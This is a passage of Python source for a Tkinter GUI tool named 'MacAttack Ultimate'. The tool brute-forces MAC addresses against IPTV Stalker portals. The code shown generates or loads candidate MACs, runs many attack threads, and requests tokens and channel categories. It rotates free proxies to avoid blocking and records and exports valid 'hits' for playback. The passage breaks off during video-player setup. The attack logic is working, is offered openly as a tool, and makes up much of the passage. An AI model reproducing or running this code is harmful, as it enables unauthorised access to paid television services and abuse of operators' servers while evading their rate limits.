                      selectcolor=Theme.BG_DARK, 
                      font=("Helvetica", 10)).pack(anchor="w", pady=5)
        tk.Checkbutton(gen, text="Auto-pause video when switching tabs", 
                      variable=self.autopause_player,
                      bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                      selectcolor=Theme.BG_DARK, 
                      font=("Helvetica", 10)).pack(anchor="w", pady=5)
        tk.Checkbutton(gen, text="Use single output file (MacAttackOutput.txt)", 
                      variable=self.single_output_file,
                      bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                      selectcolor=Theme.BG_DARK, 
                      font=("Helvetica", 10)).pack(anchor="w", pady=5)
        tk.Checkbutton(gen, text="Use custom MAC address list from file", 
                      variable=self.use_custom_macs, command=self._toggle_custom_macs,
                      bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                      selectcolor=Theme.BG_DARK, 
                      font=("Helvetica", 10)).pack(anchor="w", pady=5)

        file_row = tk.Frame(gen, bg=Theme.BG_MEDIUM)
        file_row.pack(fill="x", pady=5)
        
        self.custom_mac_file_var = tk.StringVar(value="")
        self.custom_mac_entry = ttk.Entry(file_row, textvariable=self.custom_mac_file_var, 
                                         state="disabled", font=("Helvetica", 9))
        self.custom_mac_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        self.custom_mac_btn = tk.Button(file_row, text="📁 Select File", 
                                        command=self._select_mac_file, state="disabled",
                                        bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                                        font=("Helvetica", 9), relief="flat", 
                                        padx=10, pady=5, cursor="hand2")
        self.custom_mac_btn.pack(side="right")

        # Output settings
        out = tk.LabelFrame(scrollable_frame, text=" Output & Logging ", 
                           bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY,
                           font=("Helvetica", 11, "bold"), padx=15, pady=15)
        out.pack(fill="x", padx=10, pady=10)
        
        row1 = tk.Frame(out, bg=Theme.BG_MEDIUM)
        row1.pack(fill="x", pady=5)
        
        tk.Label(row1, text="Output buffer (lines):", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 10)).pack(side="left", padx=5)
        self.output_buffer_var = tk.IntVar(value=2500)
        ttk.Spinbox(row1, from_=100, to=99999, textvariable=self.output_buffer_var, 
                   width=8, font=("Helvetica", 10)).pack(side="left")

        tk.Label(row1, text="Log Level:", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 10)).pack(side="left", padx=(20, 5))
        self.log_level_var = tk.StringVar(value="INFO")
        ttk.Combobox(row1, textvariable=self.log_level_var, 
                    values=["DEBUG", "INFO", "WARNING", "ERROR"], 
                    width=10, state="readonly", font=("Helvetica", 10)).pack(side="left")

        # Import/Export settings
        io_frame = tk.LabelFrame(scrollable_frame, text=" Import/Export Settings ", 
                                bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY,
                                font=("Helvetica", 11, "bold"), padx=15, pady=15)
        io_frame.pack(fill="x", padx=10, pady=10)
        
        tk.Button(io_frame, text="📥 Import Settings", command=self.import_settings, 
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=8, cursor="hand2").pack(side="left", padx=5)
        tk.Button(io_frame, text="💾 Export Settings", command=self.export_settings, 
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=8, cursor="hand2").pack(side="left", padx=5)
        tk.Button(io_frame, text="🔄 Reset to Defaults", command=self.reset_to_defaults,
                 bg=Theme.ACCENT_WARNING, fg="#000000", 
                 font=("Helvetica", 10, "bold"), relief="flat", 
                 padx=15, pady=8, cursor="hand2").pack(side="left", padx=5)

        # Save button and version
        bottom = tk.Frame(scrollable_frame, bg=Theme.BG_DARK)
        bottom.pack(fill="x", padx=10, pady=20)
        
        tk.Button(bottom, text="💾 SAVE SETTINGS", command=self.save_settings,
                 bg=Theme.ACCENT_SUCCESS, fg="#000000", 
                 font=("Helvetica", 12, "bold"), relief="flat", 
                 padx=30, pady=10, cursor="hand2").pack(side="left")
        
        tk.Label(bottom, text=f"MacAttack Ultimate v{APP_VERSION}\nby {CURRENT_USER} | 2025", 
                bg=Theme.BG_DARK, fg=Theme.TEXT_MUTED, 
                font=("Helvetica", 9, "italic"), justify="right").pack(side="right")
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

    # ============ Speed Controls ============

    def _on_speed_change(self, v):
        try:
            val = int(float(v))
            self.speed_var.set(val)
            if hasattr(self, 'speed_value_label'):
                self.speed_value_label.config(text=f"{val}")
        except:
            pass

    def _set_speed_preset(self, speed):
        self.speed_var.set(speed)
        self.speed_scale.set(speed)
        if hasattr(self, 'speed_value_label'):
            self.speed_value_label.config(text=f"{speed}")

    # ============ Settings Management ============

    def _toggle_custom_macs(self):
        state = "normal" if self.use_custom_macs.get() else "disabled"
        self.custom_mac_entry.config(state=state)
        self.custom_mac_btn.config(state=state)

    def _select_mac_file(self):
        f = filedialog.askopenfilename(
            title="Select MAC Address File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if f:
            self.custom_mac_file_var.set(f)
            self._load_mac_file(f)

    def _load_mac_file(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                lines = [ln.strip() for ln in fh if ln.strip()]
            
            macs = set()
            for ln in lines:
                if ln.startswith("MAC Addr:"):
                    mac = ln.replace("MAC Addr:", "").strip().upper()
                else:
                    mac = ln.strip().upper()
                
                if validate_mac_address(mac):
                    macs.add(mac)
                else:
                    logger.warning(f"Invalid MAC format skipped: {mac}")
            
            self.macs_pool = deque(macs)
            self._append_output(f"✓ Loaded {len(self.macs_pool)} valid MAC addresses from file.\n")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load MAC file:\n{e}")

    def save_settings(self):
        cfg = configparser.ConfigParser()
        cfg["Settings"] = {
            "iptv_link": self.iptv_link_var.get(),
            "portal_type": self.portal_type_var.get(),
            "speed": str(self.speed_var.get()),
            "prefix": self.prefix_var.get(),
            "request_delay": str(self.request_delay.get()),
            "autoload_to_player": str(self.autoload_to_player.get()),
            "autopause_player": str(self.autopause_player.get()),
            "single_output_file": str(self.single_output_file.get()),
            "use_custom_macs": str(self.use_custom_macs.get()),
            "custom_mac_file": self.custom_mac_file_var.get(),
            "proxy_enabled": str(self.proxy_enabled.get()),
            "proxy_remove_after_errors": str(self.proxy_remove_after_errors.get()),
            "alt_proxy_speed": str(self.alt_proxy_speed.get()),
            "proxy_list": self.proxy_text.get("1.0", "end").strip(),
            "output_buffer": str(self.output_buffer_var.get()),
            "log_level": self.log_level_var.get(),
        }
        try:
            with open(self.config_file, "w") as fh:
                cfg.write(fh)
            self._append_output("✓ Settings saved successfully.\n")
            
            log_level = getattr(logging, self.log_level_var.get())
            logger.setLevel(log_level)
            
            messagebox.showinfo("Success", "Settings saved successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save settings:\n{e}")

    def load_settings(self):
        if not os.path.exists(self.config_file):
            return
        
        cfg = configparser.ConfigParser()
        try:
            cfg.read(self.config_file)
            s = cfg["Settings"]
            
            self.iptv_link_var.set(s.get("iptv_link", self.iptv_link_var.get()))
            self.portal_type_var.set(s.get("portal_type", self.portal_type_var.get()))
            
            speed = int(s.get("speed", self.speed_var.get()))
            self.speed_var.set(speed)
            self.speed_scale.set(speed)
            
            self.prefix_var.set(s.get("prefix", self.prefix_var.get()))
            self.request_delay.set(float(s.get("request_delay", "0.3")))
            self.autoload_to_player.set(s.get("autoload_to_player", "False") == "True")
            self.autopause_player.set(s.get("autopause_player", "True") == "True")
            self.single_output_file.set(s.get("single_output_file", "True") == "True")
            self.use_custom_macs.set(s.get("use_custom_macs", "False") == "True")
            self.custom_mac_file_var.set(s.get("custom_mac_file", ""))
            self.proxy_enabled.set(s.get("proxy_enabled", "False") == "True")
            self.proxy_remove_after_errors.set(int(s.get("proxy_remove_after_errors", "5")))
            self.alt_proxy_speed.set(s.get("alt_proxy_speed", "False") == "True")
            
            self.proxy_text.delete("1.0", "end")
            self.proxy_text.insert("1.0", s.get("proxy_list", ""))
            
            self.output_buffer_var.set(int(s.get("output_buffer", "2500")))
            self.log_level_var.set(s.get("log_level", "INFO"))

            log_level = getattr(logging, self.log_level_var.get())
            logger.setLevel(log_level)

            if self.use_custom_macs.get() and self.custom_mac_file_var.get():
                self._load_mac_file(self.custom_mac_file_var.get())
                
            self._toggle_custom_macs()
            
        except Exception as e:
            logger.warning(f"Failed to load settings: {e}")

    def import_settings(self):
        f = filedialog.askopenfilename(
            title="Import Settings",
            filetypes=[("INI files", "*.ini"), ("All files", "*.*")]
        )
        if f:
            try:
                import shutil
                shutil.copy(f, self.config_file)
                self.load_settings()
                messagebox.showinfo("Success", "Settings imported successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to import settings:\n{e}")

    def export_settings(self):
        f = filedialog.asksaveasfilename(
            title="Export Settings",
            defaultextension=".ini",
            filetypes=[("INI files", "*.ini"), ("All files", "*.*")]
        )
        if f:
            try:
                self.save_settings()
                import shutil
                shutil.copy(self.config_file, f)
                messagebox.showinfo("Success", "Settings exported successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export settings:\n{e}")

    def reset_to_defaults(self):
        if messagebox.askyesno("Confirm", "Reset all settings to defaults?"):
            try:
                if os.path.exists(self.config_file):
                    os.remove(self.config_file)
                self.iptv_link_var.set("http://example.com:8080/c/")
                self.portal_type_var.set("Autodetect")
                self._set_speed_preset(10)
                self.prefix_var.set('00:1A:79: (default)')
                self.request_delay.set(0.3)
                self.autoload_to_player.set(False)
                self.autopause_player.set(True)
                self.single_output_file.set(True)
                self.use_custom_macs.set(False)
                self.custom_mac_file_var.set("")
                self.proxy_enabled.set(False)
                self.proxy_remove_after_errors.set(5)
                self.alt_proxy_speed.set(False)
                self.output_buffer_var.set(2500)
                self.log_level_var.set("INFO")
                self._toggle_custom_macs()
                messagebox.showinfo("Success", "Settings reset to defaults!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to reset settings:\n{e}")

    # ============ Attack Functions ============

    def _rand_mac_with_prefix(self, prefix: str) -> str:
        pref = prefix.replace(" (default)", "")
        if not re.match(r"^([0-9A-Fa-f]{2}:){2}[0-9A-Fa-f]{2}:$", pref):
            pref = "00:1A:79:"
        rest = ":".join(f"{random.randint(0, 255):02X}" for _ in range(3))
        return pref + rest

    def _next_mac(self) -> str:
        max_attempts = 100
        for _ in range(max_attempts):
            if self.use_custom_macs.get() and self.macs_pool:
                try:
                    mac = self.macs_pool.pop()
                    if mac not in self.tested_macs:
                        return mac
                except IndexError:
                    break
            else:
                mac = self._rand_mac_with_prefix(self.prefix_var.get())
                if mac not in self.tested_macs:
                    return mac
        
        return self._rand_mac_with_prefix(self.prefix_var.get())

    def _get_proxy_for_session(self):
        if not (self.proxy_enabled.get() and self.proxy_list):
            return {}
        proxy = random.choice(self.proxy_list)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def _remove_proxy(self, proxy_str):
        try:
            self.proxy_list.remove(proxy_str)
            logger.info(f"Removed failing proxy: {proxy_str}")
        except ValueError:
            pass
        
        current = [ln for ln in self.proxy_text.get("1.0", "end").splitlines() 
                  if ln.strip() and ln.strip() != proxy_str]
        self.proxy_text.delete("1.0", "end")
        self.proxy_text.insert("1.0", "\n".join(current))

    def start_attack(self):
        if self.running_attack:
            messagebox.showwarning("Warning", "Attack is already running!")
            return
        
        host = self.iptv_link_var.get().strip()
        if not host:
            messagebox.showwarning("Missing", "Please enter an IPTV link.")
            return
        
        self.base_url = normalize_base_url(host)
        
        global PORTAL_FORCED
        pt = self.portal_type_var.get()
        if pt == "Portal":
            PORTAL_FORCED = "portal"
        elif pt == "Stalker_Portal":
            PORTAL_FORCED = "stalker_portal"
        else:
            PORTAL_FORCED = None

        try:
            if self.single_output_file.get():
                self.output_file = open("MacAttackOutput.txt", "a", encoding="utf-8")
            else:
                safe = self.base_url.replace("http://", "").replace("https://", "").replace("/", "-").replace(":", ".")
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                self.output_file = open(f"MacAttack_{safe}_{ts}.txt", "a", encoding="utf-8")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create output file:\n{e}")
            return

        self.proxy_list = [ln.strip() for ln in self.proxy_text.get("1.0", "end").splitlines() if ln.strip()]

        self.running_attack = True
        self.paused_attack = False
        self.hits_count = 0
        self.tested_macs.clear()
        self.found_macs_list = []
        self.stats = {
            "total_tested": 0,
            "hits": 0,
            "errors": 0,
            "start_time": time.time(),
        }
        
        self.hits_label_var.set("HITS: 0")
        self.status_var.set("Status: Running")
        
        self.start_btn.config(state="disabled")
        self.pause_btn.config(state="normal")
        self.stop_btn.config(state="normal")
        
        self._append_output(f"\n{'='*60}\n")
        self._append_output(f"🚀 Starting Mac Attack at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self._append_output(f"Target: {self.base_url}\n")
        self._append_output(f"Threads: {self.speed_var.get()}\n")
        self._append_output(f"Rate Limit: {self.request_delay.get()}s\n")
        self._append_output(f"{'='*60}\n\n")

        threads = self.speed_var.get()
        self.attack_threads = []
        for i in range(max(1, threads)):
            t = threading.Thread(target=self._attack_worker, args=(i,), daemon=True)
            t.start()
            self.attack_threads.append(t)
        
        self.footer_status.config(text=f"⚡ Attack running with {threads} threads", fg=Theme.STATUS_RUNNING)

    def pause_resume_attack(self):
        if not self.running_attack:
            messagebox.showwarning("Warning", "No attack is running!")
            return
        
        self.paused_attack = not self.paused_attack
        if self.paused_attack:
            self.status_var.set("Status: Paused")
            self.pause_btn.config(text="▶ RESUME", bg=Theme.ACCENT_SUCCESS)
            self._append_output("⏸ Attack paused.\n")
            self.footer_status.config(text="⏸ Attack paused", fg=Theme.STATUS_PAUSED)
        else:
            self.status_var.set("Status: Running")
            self.pause_btn.config(text="⏸ PAUSE", bg=Theme.ACCENT_WARNING)
            self._append_output("▶ Attack resumed.\n")
            self.footer_status.config(text="⚡ Attack running", fg=Theme.STATUS_RUNNING)

    def stop_attack(self):
        if not self.running_attack:
            return
        
        self.running_attack = False
        self.paused_attack = False
        self.status_var.set("Status: Stopping...")
        self._append_output("⏹ Stopping Mac Attack...\n")
        
        self.start_btn.config(state="normal")
        self.pause_btn.config(state="disabled", text="⏸ PAUSE", bg=Theme.ACCENT_WARNING)
        self.stop_btn.config(state="disabled")
        
        def joiner():
            for t in self.attack_threads:
                t.join(timeout=2)
            self.attack_threads = []
            
            try:
                if hasattr(self, 'output_file') and self.output_file:
                    self.output_file.close()
            except Exception:
                pass
            
            self.after(0, lambda: self.status_var.set("Status: Idle"))
            self.after(0, lambda: self._append_output("✓ All tasks stopped.\n"))
            self.after(0, lambda: self.footer_status.config(text="Ready to scan", fg=Theme.TEXT_MUTED))
        
        threading.Thread(target=joiner, daemon=True).start()

    def _attack_worker(self, worker_id):
        error_counts = {}
        
        while self.running_attack:
            if self.paused_attack:
                time.sleep(0.5)
                continue
            
            mac = self._next_mac()
            self.tested_macs.add(mac)
            self.current_mac_var.set(f"Testing: {mac}")
            
            session = create_session_with_retries()
            
            proxies = self._get_proxy_for_session()
            if proxies:
                session.proxies = proxies
                proxy_str = proxies["http"].replace("http://", "")
            else:
                proxy_str = "Direct Connection"

            time.sleep(self.request_delay.get())

            try:
                token, token_random = get_token(session, self.base_url, mac, forced_ptype=PORTAL_FORCED)
                
                if not self.running_attack:
                    break
                
                self.stats["total_tested"] += 1
                
                if not token:
                    continue
                
                cats = fetch_categories(session, self.base_url, mac, token, token_random)
                
                total_channels = 0
                for group in ("Live", "Movies", "Series"):
                    if cats.get(group) and len(cats[group]) > 0:
                        first_cat = cats[group][0]
                        chs = fetch_channels(
                            session, self.base_url, mac, token, token_random,
                            first_cat["category_type"], 
                            first_cat.get("category_id") or first_cat.get("genre_id")
                        )
                        total_channels += len(chs)
                        if len(cats[group]) > 1:
                            total_channels += len(chs) * (len(cats[group]) - 1)
                        break
                
                if total_channels > 0:
                    self.hits_count += 1
                    self.stats["hits"] += 1
                    self.hits_label_var.set(f"HITS: {self.hits_count}")
                    
                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    hit_data = {
                        "portal": self.base_url,
                        "mac": mac,
                        "proxy": proxy_str,
                        "found_on": now,
                        "channels": total_channels,
                        "categories": {
                            "live": len(cats.get("Live", [])),
                            "movies": len(cats.get("Movies", [])),
                            "series": len(cats.get("Series", []))
                        }
                    }
                    self.found_macs_list.append(hit_data)
                    
                    msg = (
                        f"\n{'='*60}\n"
                        f"🎯 HIT FOUND!\n"
                        f"{'='*60}\n"
                        f"Portal  : {self.base_url}\n"
                        f"MAC Addr: {mac}\n"
                        f"Proxy IP: {proxy_str}\n"
                        f"Found on: {now}\n"
                        f"Channels: ~{total_channels}\n"
                        f"Live    : {len(cats.get('Live', []))} categories\n"
                        f"Movies  : {len(cats.get('Movies', []))} categories\n"
                        f"Series  : {len(cats.get('Series', []))} categories\n"
                        f"{'='*60}\n\n"
                    )
                    
                    self._append_output(msg)
                    self.found_macs_text.insert("end", msg)
                    self.found_macs_text.see("end")
                    
                    try:
                        self.output_file.write(msg)
                        self.output_file.flush()
                    except Exception:
                        pass
                    
                    if self.autoload_to_player.get():
                        self.host_var.set(self.base_url)
                        self.mac_var.set(mac)
                        self.after(0, self.player_get_playlist)
                    
                    if proxy_str in error_counts:
                        error_counts[proxy_str] = 0
                
            except Exception as e:
                self.stats["errors"] += 1
                error_msg = str(e)
                
                if proxy_str != "Direct Connection":
                    c = error_counts.get(proxy_str, 0) + 1
                    error_counts[proxy_str] = c
                    self._append_error(f"[Worker {worker_id}] Proxy {proxy_str} error ({c}): {error_msg}\n")
                    
                    limit = self.proxy_remove_after_errors.get()
                    if self.proxy_enabled.get() and limit > 0 and c >= limit:
                        self._append_error(f"❌ Proxy {proxy_str} removed after {c} consecutive errors.\n")
                        self._remove_proxy(proxy_str)
                        error_counts.pop(proxy_str, None)
                else:
                    self._append_error(f"[Worker {worker_id}] Connection error: {error_msg}\n")
            
            time.sleep(0.05)

    def test_single_mac(self):
        mac = self.test_mac_var.get().strip().upper()
        if not mac:
            messagebox.showwarning("Missing", "Please enter a MAC address to test.")
            return
        
        if not validate_mac_address(mac):
            messagebox.showerror("Invalid", "Invalid MAC address format. Use XX:XX:XX:XX:XX:XX")
            return
        
        host = self.iptv_link_var.get().strip()
        if not host:
            messagebox.showwarning("Missing", "Please enter an IPTV link.")
            return
        
        base_url = normalize_base_url(host)
        
        self._append_output(f"\n🔍 Testing MAC: {mac} on {base_url}\n")
        
        def worker():
            try:
                session = create_session_with_retries()
                
                proxies = self._get_proxy_for_session()
                if proxies:
                    session.proxies = proxies
                
                forced = None
                if self.portal_type_var.get() == "Portal":
                    forced = "portal"
                elif self.portal_type_var.get() == "Stalker_Portal":
                    forced = "stalker_portal"
                
                token, token_random = get_token(session, base_url, mac, forced_ptype=forced)
                
                if not token:
                    self.after(0, lambda: self._append_output(f"❌ Failed: No token received for {mac}\n"))
                    return
                
                cats = fetch_categories(session, base_url, mac, token, token_random)
                
                total_categories = len(cats.get("Live", [])) + len(cats.get("Movies", [])) + len(cats.get("Series", []))
                
                if total_categories > 0:
                    msg = (
                        f"✅ Success! MAC {mac} is valid!\n"
                        f"   Live: {len(cats.get('Live', []))} categories\n"
                        f"   Movies: {len(cats.get('Movies', []))} categories\n"
                        f"   Series: {len(cats.get('Series', []))} categories\n\n"
                    )
                    self.after(0, lambda: self._append_output(msg))
                else:
                    self.after(0, lambda: self._append_output(f"⚠️ Token received but no content found for {mac}\n"))
                    
            except Exception as e:
                self.after(0, lambda: self._append_output(f"❌ Error testing {mac}: {e}\n"))
        
        threading.Thread(target=worker, daemon=True).start()

    def test_single_mac_dialog(self):
        """Open dialog to test a single MAC."""
        dialog = tk.Toplevel(self)
        dialog.title("🔍 Test Single MAC")
        dialog.geometry("500x300")
        dialog.configure(bg=Theme.BG_DARK)
        dialog.transient(self)
        dialog.grab_set()
        
        tk.Label(dialog, text="🔍 TEST SINGLE MAC ADDRESS", 
                bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(pady=20)
        
        frame = tk.Frame(dialog, bg=Theme.BG_MEDIUM)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        tk.Label(frame, text="MAC Address:", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 11)).pack(pady=10)
        
        mac_entry = ttk.Entry(frame, font=("Courier", 12), width=25)
        mac_entry.pack(pady=10)
        mac_entry.focus()
        
        result_label = tk.Label(frame, text="", bg=Theme.BG_MEDIUM, 
                               fg=Theme.TEXT_PRIMARY, font=("Helvetica", 10), wraplength=400)
        result_label.pack(pady=10)
        
        def test_mac():
            mac = mac_entry.get().strip().upper()
            if not validate_mac_address(mac):
                result_label.config(text="❌ Invalid MAC address format!", fg=Theme.ACCENT_ERROR)
                return
            
            result_label.config(text="⏳ Testing... Please wait...", fg=Theme.ACCENT_WARNING)
            dialog.update()
            
            self.test_mac_var.set(mac)
            self.test_single_mac()
            
            result_label.config(text=f"✓ Test started for {mac}\nCheck the output log for results.", 
                              fg=Theme.ACCENT_SUCCESS)
        
        btn_frame = tk.Frame(dialog, bg=Theme.BG_DARK)
        btn_frame.pack(fill="x", padx=20, pady=20)
        
        tk.Button(btn_frame, text="🔍 Test MAC", command=test_mac,
                 bg=Theme.ACCENT_PRIMARY, fg="#000000", 
                 font=("Helvetica", 11, "bold"), relief="flat", 
                 padx=25, pady=10, cursor="hand2").pack(side="left")
        
        tk.Button(btn_frame, text="Close", command=dialog.destroy,
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 11), relief="flat", 
                 padx=25, pady=10, cursor="hand2").pack(side="right")

    def export_hits_csv(self):
        if not self.found_macs_list:
            messagebox.showwarning("No Data", "No hits to export.")
            return
        
        f = filedialog.asksaveasfilename(
            title="Export Hits as CSV",
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")]
        )
        
        if f:
            try:
                with open(f, 'w', newline='', encoding='utf-8') as csvfile:
                    fieldnames = ['Portal', 'MAC Address', 'Proxy', 'Found On', 'Total Channels', 
                                 'Live Categories', 'Movie Categories', 'Series Categories']
                    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                    
                    writer.writeheader()
                    for hit in self.found_macs_list:
                        writer.writerow({
                            'Portal': hit['portal'],
                            'MAC Address': hit['mac'],
                            'Proxy': hit['proxy'],
                            'Found On': hit['found_on'],
                            'Total Channels': hit['channels'],
                            'Live Categories': hit['categories']['live'],
                            'Movie Categories': hit['categories']['movies'],
                            'Series Categories': hit['categories']['series']
                        })
                
                messagebox.showinfo("Success", f"✓ Exported {len(self.found_macs_list)} hits to CSV!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export CSV:\n{e}")

    def export_hits_json(self):
        if not self.found_macs_list:
            messagebox.showwarning("No Data", "No hits to export.")
            return
        
        f = filedialog.asksaveasfilename(
            title="Export Hits as JSON",
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if f:
            try:
                with open(f, 'w', encoding='utf-8') as jsonfile:
                    json.dump(self.found_macs_list, jsonfile, indent=2)
                
                messagebox.showinfo("Success", f"✓ Exported {len(self.found_macs_list)} hits to JSON!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export JSON:\n{e}")

    def export_logs(self):
        f = filedialog.asksaveasfilename(
            title="Export Logs",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if f:
            try:
                with open(f, 'w', encoding='utf-8') as logfile:
                    logfile.write("=== OUTPUT LOG ===\n\n")
                    logfile.write(self.output_text.get("1.0", "end"))
                    logfile.write("\n\n=== ERROR LOG ===\n\n")
                    logfile.write(self.error_text.get("1.0", "end"))
                
                messagebox.showinfo("Success", "✓ Logs exported successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export logs:\n{e}")

    def _append_output(self, text):
        def append():
            self.output_text.insert("end", text)
            self.output_text.see("end")
            
            lines = int(self.output_text.index('end-1c').split('.')[0])
            keep = self.output_buffer_var.get()
            if lines > keep:
                self.output_text.delete("1.0", f"{lines-keep}.0")
        
        if threading.current_thread() != threading.main_thread():
            self.after(0, append)
        else:
            append()

    def _append_error(self, text):
        def append():
            self.error_text.insert("end", text)
            self.error_text.see("end")
            
            lines = int(self.error_text.index('end-1c').split('.')[0])
            keep = 100
            if lines > keep:
                self.error_text.delete("1.0", f"{lines-keep}.0")
        
        if threading.current_thread() != threading.main_thread():
            self.after(0, append)
        else:
            append()

    # ============ Statistics ============

    def update_statistics(self):
        if self.running_attack and self.stats["start_time"]:
            elapsed = time.time() - self.stats["start_time"]
            
            total = self.stats["total_tested"]
            hits = self.stats["hits"]
            errors = self.stats["errors"]
            
            success_rate = (hits / total * 100) if total > 0 else 0
            tests_per_sec = total / elapsed if elapsed > 0 else 0
            hits_per_hour = (hits / elapsed * 3600) if elapsed > 0 else 0
            
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            running_time = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            self.stat_labels["total_tested"].config(text=str(total))
            self.stat_labels["hits"].config(text=str(hits))
            self.stat_labels["errors"].config(text=str(errors))
            self.stat_labels["success_rate"].config(text=f"{success_rate:.2f}%")
            self.stat_labels["running_time"].config(text=running_time)
            self.stat_labels["tests_per_sec"].config(text=f"{tests_per_sec:.2f}")
            self.stat_labels["hits_per_hour"].config(text=f"{hits_per_hour:.2f}")
        
        self.after(1000, self.update_statistics)

    def reset_statistics(self):
        if messagebox.askyesno("Confirm", "Reset all statistics?"):
            self.stats = {
                "total_tested": 0,
                "hits": 0,
                "errors": 0,
                "start_time": time.time() if self.running_attack else None,
            }
            
            for key in self.stat_labels:
                self.stat_labels[key].config(text="0")
            
            self.found_macs_text.delete("1.0", "end")
            self.found_macs_list = []

    def copy_selected_mac(self, event):
        try:
            selected = self.found_macs_text.selection_get()
            mac_match = re.search(r'([0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2})', selected)
            if mac_match:
                mac = mac_match.group(1)
                self.clipboard_clear()
                self.clipboard_append(mac)
                self.footer_info.config(text=f"✓ Copied: {mac}", fg=Theme.ACCENT_SUCCESS)
                self.after(3000, lambda: self.footer_info.config(text="🟢 All systems operational", fg=Theme.ACCENT_SUCCESS))
        except:
            pass

    # ============ Proxy Management ============

    def fetch_free_proxies_ui(self):
        self.proxy_output.delete("1.0", "end")
        self.proxy_output.insert("end", "🌐 Fetching free proxies from 6 sources...\n\n")
        self.footer_status.config(text="🌐 Fetching proxies...", fg=Theme.ACCENT_PRIMARY)
        
        def worker():
            proxies = fetch_free_proxies()
            
            if proxies:
                existing = set(ln.strip() for ln in self.proxy_text.get("1.0", "end").splitlines() if ln.strip())
                new_proxies = [p for p in proxies if p not in existing]
                
                if new_proxies:
                    self.after(0, lambda: self.proxy_text.insert("end", "\n".join(new_proxies) + "\n"))
                    msg = f"✅ Fetched {len(proxies)} proxies, added {len(new_proxies)} new ones!\n"
                else:
                    msg = f"ℹ️ Fetched {len(proxies)} proxies, but all were already in the list.\n"
                
                self.after(0, lambda: self.proxy_output.insert("end", msg))
                self.after(0, lambda: setattr(self, 'proxy_list', 
                          [ln.strip() for ln in self.proxy_text.get("1.0", "end").splitlines() if ln.strip()]))
            else:
                self.after(0, lambda: self.proxy_output.insert("end", "❌ Failed to fetch any proxies.\n"))
            
            self.after(0, lambda: self.footer_status.config(text="Ready to scan", fg=Theme.TEXT_MUTED))
        
        threading.Thread(target=worker, daemon=True).start()

    def test_proxies(self):
        proxies = [ln.strip() for ln in self.proxy_text.get("1.0", "end").splitlines() if ln.strip()]
        
        if not proxies:
            messagebox.showwarning("No Proxies", "No proxies to test.")
            return
        
        dialog = ProxyTestDialog(self, proxies)
        
        def check_dialog():
            if dialog.winfo_exists():
                self.after(500, check_dialog)
            else:
                if dialog.results:
                    self.proxy_text.delete("1.0", "end")
                    self.proxy_text.insert("1.0", "\n".join(dialog.results))
                    self.proxy_list = dialog.results
                    self.proxy_output.insert("end", f"\n✅ Updated list with {len(dialog.results)} working proxies!\n")
        
        self.after(500, check_dialog)

    def import_proxies(self):
        f = filedialog.askopenfilename(
            title="Import Proxies",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if f:
            try:
                with open(f, 'r', encoding='utf-8') as fh:
                    content = fh.read()
                    self.proxy_text.insert("end", content + "\n")
                messagebox.showinfo("Success", "✓ Proxies imported successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to import proxies:\n{e}")

    def export_proxies(self):
        f = filedialog.asksaveasfilename(
            title="Export Proxies",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if f:
            try:
                content = self.proxy_text.get("1.0", "end").strip()
                with open(f, 'w', encoding='utf-8') as fh:
                    fh.write(content)
                messagebox.showinfo("Success", "✓ Proxies exported successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export proxies:\n{e}")

    # ============ Video Player ============

    def init_vlc_instance(self):
        try:
            if self.vlc_player:
                self.vlc_player.release()
            if self.vlc_instance:
                self.vlc_instance.release()
        except Exception:
            pass

        opts = [
            "--repeat",
            "--no-plugins-cache",
